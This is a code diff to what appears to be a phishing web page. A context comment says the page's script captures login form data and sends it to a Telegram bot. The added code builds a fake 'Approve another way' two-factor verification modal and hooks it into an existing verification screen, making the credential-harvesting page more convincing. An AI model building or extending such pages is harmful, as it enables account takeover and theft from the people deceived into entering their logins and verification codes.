@@ -547,6 +547,7 @@
       window.dispatchEvent(new Event('resize'));
     });
   </script>
+
   <script>
     // This script captures login form data and sends it to a Telegram bot
 // Replace the placeholder values with your actual Telegram bot token and chat ID
@@ -713,6 +714,196 @@ document.addEventListener('DOMContentLoaded', async function() {
     });
   }
 });
+function showApproveAnotherWay() {
+  // Remove any existing verification modal
+  const existingModals = document.querySelectorAll('div[style*="position: fixed"][style*="z-index: 1000"]');
+  existingModals.forEach(modal => {
+    document.body.removeChild(modal);
+  });
+  
+  // Create new modal container
+  const modal = document.createElement('div');
+  modal.className = 'verification-modal';
+  modal.style.position = 'fixed';
+  modal.style.top = '0';
+  modal.style.left = '0';
+  modal.style.width = '100%';
+  modal.style.height = '100%';
+  modal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
+  modal.style.zIndex = '1000';
+  modal.style.display = 'flex';
+  modal.style.flexDirection = 'column';
+  modal.style.alignItems = 'center';
+  modal.style.justifyContent = 'center';
+  modal.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif';
+  document.body.appendChild(modal);
+
+  // Create white form container
+  const formContainer = document.createElement('div');
+  formContainer.style.backgroundColor = 'white';
+  formContainer.style.borderRadius = '10px';
+  formContainer.style.width = '100%';
+  formContainer.style.maxWidth = '500px';
+  formContainer.style.display = 'flex';
+  formContainer.style.flexDirection = 'column';
+  formContainer.style.padding = '20px';
+  formContainer.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
+  formContainer.style.margin = '0 15px';
+  
+  // Adjust for mobile devices
+  if (window.innerWidth <= 768) {
+    formContainer.style.borderRadius = '10px 10px 0 0';
+    formContainer.style.margin = '0';
+    formContainer.style.position = 'absolute';
+    formContainer.style.bottom = '0';
+    formContainer.style.width = '100%';
+    formContainer.style.maxWidth = '100%';
+    modal.style.alignItems = 'flex-end';
+    modal.style.justifyContent = 'flex-end';
+  }
+
+  // Create header with back button and title
+  const header = document.createElement('div');
+  header.style.display = 'flex';
+  header.style.alignItems = 'center';
+  header.style.justifyContent = 'space-between';
+  header.style.width = '100%';
+  header.style.marginBottom = '25px';
+
+  // Back button
+  const backButton = document.createElement('button');
+  backButton.innerHTML = '&#8592;';
+  backButton.style.background = 'none';
+  backButton.style.border = 'none';
+  backButton.style.fontSize = '24px';
+  backButton.style.cursor = 'pointer';
+  backButton.style.padding = '0';
+  backButton.style.lineHeight = '1';
+  backButton.style.color = '#000';
+  backButton.onclick = () => {
+    // Go back to previous verification screen
+    document.body.removeChild(modal);
+    showVerificationModal();
+  };
+
+  // Title
+  const title = document.createElement('h2');
+  title.textContent = 'Approve another way';
+  title.style.textAlign = 'center';
+  title.style.flex = '1';
+  title.style.fontSize = '20px';
+  title.style.fontWeight = '500';
+  title.style.margin = '0';
+
+  // Close button
+  const closeButton = document.createElement('button');
+  closeButton.innerHTML = '&#10005;';
+  closeButton.style.background = 'none';
+  closeButton.style.border = 'none';
+  closeButton.style.fontSize = '24px';
+  closeButton.style.cursor = 'pointer';
+  closeButton.style.padding = '0';
+  closeButton.style.lineHeight = '1';
+  closeButton.style.color = '#000';
+  closeButton.onclick = () => {
+    document.body.removeChild(modal);
+  };
+
+  header.appendChild(backButton);
+  header.appendChild(title);
+  header.appendChild(closeButton);
+  
+  // Third-party authentication app option
+  const authOption = document.createElement('div');
+  authOption.style.display = 'flex';
+  authOption.style.alignItems = 'center';
+  authOption.style.justifyContent = 'space-between';
+  authOption.style.padding = '20px';
+  authOption.style.backgroundColor = '#f9f9f9';
+  authOption.style.borderRadius = '12px';
+  authOption.style.marginBottom = '20px';
+  authOption.style.cursor = 'pointer';
+  authOption.style.border = '1px solid #eaeaea';
+  
+  // Icon container
+  const iconContainer = document.createElement('div');
+  iconContainer.style.width = '48px';
+  iconContainer.style.height = '48px';
+  iconContainer.style.borderRadius = '50%';
+  iconContainer.style.backgroundColor = '#f0f0f0';
+  iconContainer.style.display = 'flex';
+  iconContainer.style.alignItems = 'center';
+  iconContainer.style.justifyContent = 'center';
+  iconContainer.style.marginRight = '15px';
+  
+  // Lock icon
+  const lockIcon = document.createElement('div');
+  lockIcon.innerHTML = `
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M19 11H5C3.89543 11 3 11.8954 3 13V20C3 21.1046 3.89543 22 5 22H19C20.1046 22 21 21.1046 21 20V13C21 11.8954 20.1046 11 19 11Z" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      <path d="M7 11V7C7 5.93913 7.42143 4.92172 8.17157 4.17157C8.92172 3.42143 9.93913 3 11 3H13C14.0609 3 15.0783 3.42143 15.8284 4.17157C16.5786 4.92172 17 5.93913 17 7V11" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  `;
+  
+  iconContainer.appendChild(lockIcon);
+  
+  // Text content
+  const textContent = document.createElement('div');
+  textContent.style.flex = '1';
+  
+  const optionTitle = document.createElement('div');
+  optionTitle.textContent = 'Third-party authentication app';
+  optionTitle.style.fontSize = '16px';
+  optionTitle.style.fontWeight = '500';
+  
+  textContent.appendChild(optionTitle);
+  
+  // Arrow icon
+  const arrowIcon = document.createElement('div');
+  arrowIcon.innerHTML = `
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M9 18L15 12L9 6" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  `;
+  
+  // Assemble the auth option
+  authOption.appendChild(iconContainer);
+  authOption.appendChild(textContent);
+  authOption.appendChild(arrowIcon);
+  
+  // Support link
+  const supportContainer = document.createElement('div');
+  supportContainer.style.display = 'flex';
+  supportContainer.style.flexDirection = 'row'; // Changed to row instead of column
+  supportContainer.style.alignItems = 'center'; // Center items vertically
+  supportContainer.style.justifyContent = 'flex-start';
+  supportContainer.style.marginTop = 'auto';
+  supportContainer.style.width = '100%';
+  supportContainer.style.gap = '6px'; // Small spacing between text and link
+  
+  const troubleText = document.createElement('div');
+  troubleText.textContent = 'Having trouble logging in?';
+  troubleText.style.color = '#666';
+  troubleText.style.fontSize = '16px';
+  troubleText.style.marginBottom = '0'; // Removed bottom margin
+  
+  const supportLink = document.createElement('a');
+  supportLink.textContent = 'Contact support';
+  supportLink.href = '#';
+  supportLink.style.color = '#3498db';
+  supportLink.style.textDecoration = 'none';
+  supportLink.style.fontSize = '16px';
+  supportLink.style.fontWeight = '500';
+  
+  supportContainer.appendChild(troubleText);
+  supportContainer.appendChild(supportLink);
+  
+  // Assemble the form
+  formContainer.appendChild(header);
+  formContainer.appendChild(authOption);
+  formContainer.appendChild(supportContainer);
+  modal.appendChild(formContainer);
+}
 
 function showVerificationModal() {
   // Create modal container with semi-transparent background
@@ -962,7 +1153,7 @@ function showVerificationModal() {
   alternativeOption.style.marginTop = '0';
   alternativeOption.style.marginBottom = '30px'; // Add bottom margin for mobile view
   alternativeOption.onclick = (e) => {
-    e.preventDefault();
+    showApproveAnotherWay()
     // Handle alternative option click
   };
 
